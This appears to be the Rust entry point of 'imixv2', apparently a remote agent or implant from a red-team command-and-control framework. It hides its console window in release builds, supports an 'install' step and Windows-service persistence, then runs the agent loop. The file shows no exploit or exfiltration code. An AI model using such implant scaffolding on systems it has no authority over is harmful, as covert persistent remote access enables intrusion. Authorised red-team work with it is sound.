#![cfg_attr(
    all(not(debug_assertions), not(feature = "win_service")),
    windows_subsystem = "windows"
)]

extern crate alloc;

use anyhow::Result;

#[cfg(all(feature = "win_service", windows))]
#[macro_use]
extern crate windows_service;
#[cfg(all(feature = "win_service", windows))]
mod win_service;

pub use pb::config::Config;
pub use transport::{ActiveTransport, Transport};

mod agent;
mod assets;
mod install;
mod run;
mod shell;
mod task;
#[cfg(test)]
mod tests;
mod version;

#[tokio::main]
async fn main() -> Result<()> {
    run::init_logger();

    #[cfg(feature = "install")]
    {
        #[cfg(debug_assertions)]
        log::info!("beginning installation");

        if std::env::args().any(|arg| arg == "install") {
            return install::install().await;
        }
    }

    #[cfg(all(feature = "win_service", windows))]
    match windows_service::service_dispatcher::start("imixv2", ffi_service_main) {
        Ok(_) => {
            return Ok(());
        }
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to start service (running as exe?): {_err}");
        }
    }

    run::run_agent().await
}

// ============ Windows Service =============
#[cfg(all(feature = "win_service", windows))]
define_windows_service!(ffi_service_main, service_main);

#[cfg(all(feature = "win_service", windows))]
#[tokio::main]
async fn service_main(arguments: Vec<std::ffi::OsString>) {
    crate::win_service::handle_service_main(arguments);
    let _ = run::run_agent().await;
}
